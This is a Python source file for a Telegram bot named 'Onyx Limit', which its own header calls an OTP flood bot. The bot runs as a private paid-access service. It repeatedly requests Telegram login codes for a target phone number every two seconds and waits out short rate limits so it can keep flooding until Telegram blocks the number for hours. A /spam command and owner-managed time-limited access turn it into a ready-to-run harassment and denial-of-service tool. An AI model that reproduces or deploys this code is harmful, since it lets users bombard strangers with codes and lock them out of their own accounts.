# language: Python, file: main.py, runtime: Python 3.10+
# Onyx Limit — Telegram OTP flood bot with time-based access control
# Railway-ready: all secrets via environment variables

import asyncio
import json
import logging
import os
import re
import time
from collections import defaultdict
from datetime import datetime, timezone

from dotenv import load_dotenv
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError, PhoneNumberInvalidError, PhoneNumberBannedError

load_dotenv()

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID    = int(os.getenv("API_ID", "0") or "0")
API_HASH  = os.getenv("API_HASH", "")
OWNER_ID  = int(os.getenv("OWNER_ID", "0") or "0")

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH")

if not OWNER_ID:
    raise SystemExit("Missing OWNER_ID")

MIN_LIMIT_HOURS = 7          # permanent stop only when wait ≥ 7 h
SEND_INTERVAL   = 2          # seconds between successful code requests
ACCESS_FILE     = "access.json"

# ─── STATE ────────────────────────────────────────────────────────────────────
active_jobs: dict[int, dict[str, asyncio.Task]] = defaultdict(dict)
PHONE_RE = re.compile(r"^\+\d{8,15}$")

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("onyx_limit")


# ─── ACCESS CONTROL ───────────────────────────────────────────────────────────
def load_access() -> dict:
    if not os.path.exists(ACCESS_FILE):
        return {}
    try:
        with open(ACCESS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def save_access(data: dict) -> None:
    with open(ACCESS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


def has_access(user_id: int) -> bool:
    if is_owner(user_id):
        return True
    data = load_access()
    entry = data.get(str(user_id))
    if not entry:
        return False
    return time.time() < entry.get("expires", 0)


def days_left(user_id: int) -> float:
    if is_owner(user_id):
        return float("inf")
    data = load_access()
    entry = data.get(str(user_id))
    if not entry:
        return 0.0
    remaining = entry.get("expires", 0) - time.time()
    return max(0.0, remaining / 86400)


# ─── WORKER ───────────────────────────────────────────────────────────────────
async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
    """
    Keep requesting codes until a FloodWait ≥ MIN_LIMIT_HOURS is hit.
    Short FloodWaits (< 7 h) → sleep the wait, then resume.
    Already-limited numbers (any FloodWait on first try) → stop + report.
    """
    first_attempt = True

    while True:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            log.info("OTP sent → %s (user %s)", phone, user_id)
            first_attempt = False

        except FloodWaitError as e:
            wait = e.seconds
            hours = wait / 3600

            if first_attempt:
                # Number was already limited when the job started
                msg = (
                    f"🚫 OTP Sending Stopped!\n"
                    f"Number: {phone}\n"
                    f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
                    f"before trying this number again.\n"
                    f"Stopping the process."
                )
                await bot.send_message(chat_id, msg)
                break

            # Not the first attempt → we hit a limit while running
            if hours >= MIN_LIMIT_HOURS:
                msg = (
                    f"🚫 OTP Sending Stopped!\n"
                    f"Number: {phone}\n"
                    f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
                    f"before trying this number again.\n"
                    f"Stopping the process."
                )
                await bot.send_message(chat_id, msg)
                break
            else:
                # Short limit → wait it out, then continue
                log.info(
                    "Short FloodWait %.1fh on %s — sleeping %ss then resume",
                    hours, phone, wait,
                )
                await bot.send_message(
                    chat_id,
                    f"⏳ Short rate-limit on {phone}: waiting {hours:.1f} h then resuming…",
                )
                await asyncio.sleep(wait)
                first_attempt = False
                continue

        except (PhoneNumberInvalidError, PhoneNumberBannedError) as e:
            await bot.send_message(chat_id, f"❌ {phone} rejected by Telegram: {e}")
            break

        except asyncio.CancelledError:
            raise

        except Exception as ex:
            log.warning("Transient error on %s: %s", phone, ex)
            await asyncio.sleep(5)
            continue

        finally:
            try:
                await client.disconnect()
            except Exception:
                pass

        await asyncio.sleep(SEND_INTERVAL)

    # Cleanup
    if phone in active_jobs.get(user_id, {}):
        del active_jobs[user_id][phone]
        if not active_jobs[user_id]:
            del active_jobs[user_id]


# ─── HELPERS ──────────────────────────────────────────────────────────────────
def is_valid_phone(text: str) -> bool:
    return bool(PHONE_RE.match(text.strip()))


async def start_job(user_id: int, phone: str, chat_id: int, bot) -> str:
    phone = phone.strip()
    if not is_valid_phone(phone):
        return "❌ Invalid phone number format. Include country code (e.g. +919876543210)."

    if phone in active_jobs.get(user_id, {}):
        return f"⚠️ Already running on {phone}. Use /stop {phone} to cancel."

    task = asyncio.create_task(otp_worker(user_id, phone, chat_id, bot))
    active_jobs[user_id][phone] = task

    return (
        f"🚀 Onyx Limit started on {phone}\n"
        f"Sending every {SEND_INTERVAL}s.\n"
        f"Short limits (< {MIN_LIMIT_HOURS} h) → wait & resume.\n"
        f"Long limits (≥ {MIN_LIMIT_HOURS} h) → permanent stop."
    )


async def stop_jobs(user_id: int, phone: str | None = None) -> str:
    jobs = active_jobs.get(user_id, {})
    if not jobs:
        return "⚠️ No active processes found."

    if phone:
        phone = phone.strip()
        task = jobs.pop(phone, None)
        if task is None:
            return f"⚠️ No active process for {phone}."
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        if not jobs:
            del active_jobs[user_id]
        return f"🛑 Stopped process for {phone}."

    count = len(jobs)
    for t in list(jobs.values()):
        t.cancel()
    for t in list(jobs.values()):
        try:
            await t
        except asyncio.CancelledError:
            pass
    del active_jobs[user_id]
    return f"🛑 Stopped {count} active process(es)."


# ─── ACCESS DECORATORS ────────────────────────────────────────────────────────
def require_access(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not has_access(user.id):
            await update.message.reply_text(
                "⛔ Access denied.\n\n"
                "This bot is private. Contact the owner whose username is listed "
                "in the bot’s bio to request access."
            )
            return
        return await func(update, context)
    return wrapper


def require_owner(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_owner(update.effective_user.id):
            await update.message.reply_text("⛔ Owner only.")
            return
        return await func(update, context)
    return wrapper


# ─── HANDLERS ─────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not has_access(user.id):
        await update.message.reply_text(
            "⛔ Access denied.\n\n"
            "Onyx Limit is a private service.\n"
            "Contact the owner whose username is listed in the bot’s bio to request access."
        )
        return

    left = days_left(user.id)
    if left == float("inf"):
        access_line = "🔑 Owner access (unlimited)"
    else:
        access_line = f"⏳ Access remaining: {left:.1f} day(s)"

    text = (
        f"🖤 <b>Onyx Limit</b>\n"
        f"Professional OTP rate-limit tool\n\n"
        f"{access_line}\n\n"
        f"<b>Private chat</b>\n"
        f"Just send a number → <code>+919876543210</code>\n\n"
        f"<b>Group chat</b>\n"
        f"<code>/spam +919876543210</code>\n\n"
        f"<b>Control</b>\n"
        f"<code>/stop</code> — stop all\n"
        f"<code>/stop +number</code> — stop one number\n\n"
        f"• Already-limited numbers → immediate stop + exact wait time\n"
        f"• Short limits (&lt; {MIN_LIMIT_HOURS} h) → wait & resume\n"
        f"• Long limits (≥ {MIN_LIMIT_HOURS} h) → permanent stop"
    )
    await update.message.reply_text(text, parse_mode="HTML")


@require_access
async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /spam +919876543210")
        return
    phone = context.args[0]
    reply = await start_job(
        update.effective_user.id,
        phone,
        update.effective_chat.id,
        context.bot,
    )
    await update.message.reply_text(reply)


@require_access
async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = context.args[0] if context.args else None
    reply = await stop_jobs(update.effective_user.id, phone)
    await update.message.reply_text(reply)


@require_access
async def private_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    text = update.message.text.strip()
    if not text.startswith("+"):
        return
    reply = await start_job(
        update.effective_user.id,
        text,
        update.effective_chat.id,
        context.bot,
    )
    await update.message.reply_text(reply)


# ─── OWNER COMMANDS ───────────────────────────────────────────────────────────
@require_owner
async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /adduser <user_id> <days>")
        return

    try:
        uid = int(context.args[0])
        days = float(context.args[1])
        if days <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ user_id must be integer, days must be positive number.")
        return

    data = load_access()
    now = time.time()
    expires = now + (days * 86400)

    data[str(uid)] = {
        "expires": expires,
        "added": now,
        "days_granted": days,
    }
    save_access(data)

    exp_str = datetime.fromtimestamp(expires, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    await update.message.reply_text(
        f"✅ Access granted\n"
        f"User ID: <code>{uid}</code>\n"
        f"Days: {days}\n"
        f"Expires: {exp_str}",
        parse_mode="HTML",
    )


@require_owner
async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return

    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ user_id must be integer.")
        return

    data = load_access()
    if str(uid) not in data:
        await update.message.reply_text(f"⚠️ User {uid} not in access list.")
        return

    del data[str(uid)]
    save_access(data)
    await update.message.reply_text(f"🗑️ Access removed for <code>{uid}</code>", parse_mode="HTML")


@require_owner
async def cmd_showuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_access()
    if not data:
        await update.message.reply_text("No users in access list.")
        return

    lines = ["📋 <b>Access List</b>\n"]
    now = time.time()

    for uid_str, entry in sorted(data.items(), key=lambda x: x[1].get("expires", 0)):
        uid = int(uid_str)
        expires = entry.get("expires", 0)
        remaining = max(0, expires - now)
        days = remaining / 86400
        status = "✅" if remaining > 0 else "❌ EXPIRED"
        exp_str = datetime.fromtimestamp(expires, tz=timezone.utc).strftime("%Y-%m-%d")
        lines.append(
            f"{status} <code>{uid}</code> — {days:.1f}d left (until {exp_str})"
        )

    await update.message.reply_text("\n".join(lines), parse_mode="HTML")


# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("adduser", cmd_adduser))
    app.add_handler(CommandHandler("removeuser", cmd_removeuser))
    app.add_handler(CommandHandler("showuser", cmd_showuser))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, private_number))

    log.info("Onyx Limit starting… (MIN_LIMIT_HOURS=%s)", MIN_LIMIT_HOURS)
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
